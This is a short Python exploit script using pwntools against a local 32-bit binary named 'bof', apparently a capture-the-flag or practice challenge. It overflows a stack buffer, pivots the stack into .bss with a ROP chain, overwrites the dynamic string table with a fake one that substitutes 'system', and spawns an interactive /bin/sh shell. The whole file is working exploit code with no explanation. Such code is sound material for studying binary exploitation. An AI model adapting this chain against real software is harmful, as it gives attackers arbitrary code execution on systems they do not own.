#!/bin/python3
from pwn import *
# context.log_level = 'debug'

elf = ELF('./bof')
offset = 0x6c+4
read_plt = elf.plt['read']

# 0x08049301 : pop esi ; pop edi ; pop ebp ; ret
ppp_ret = 0x08049301
pop_ebp_ret = 0x08049303
leave_ret = 0x08049115

stack_size = 0x800
bss_addr = 0x0804B2B4
base_stage = bss_addr + stack_size

p = process('./bof')
p.recvuntil('\n')
pause()
payload  = b'a'*offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(0x100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)

p.sendline(payload)

strtab_addr = 0x0804B1D8
write_plt_1 = 0x08049086

fake_dynstr  = b'\x00libc.so.6\x00_IO_stdin_used\x00'
fake_dynstr += b'stdin\x00strlen\x00read\x00stdout\x00'
fake_dynstr += b'setbuf\x00__libc_start_main\x00'
fake_dynstr += b'system\x00'

payload2  = b'AAAA'
payload2 += p32(read_plt)
payload2 += p32(ppp_ret)
payload2 += p32(0)
payload2 += p32(strtab_addr)
payload2 += p32(8)
payload2 += p32(write_plt_1)
payload2 += b'AAAA'
payload2 += p32(base_stage + 0x24)
payload2 += b'/bin/sh\x00'
payload2 += fake_dynstr

pause()
p.sendline(payload2)

fake_dynstr_addr = base_stage + 0x2c

payload3  = p32(0x5)
payload3 += p32(fake_dynstr_addr)

pause()
p.send(payload3)

p.interactive()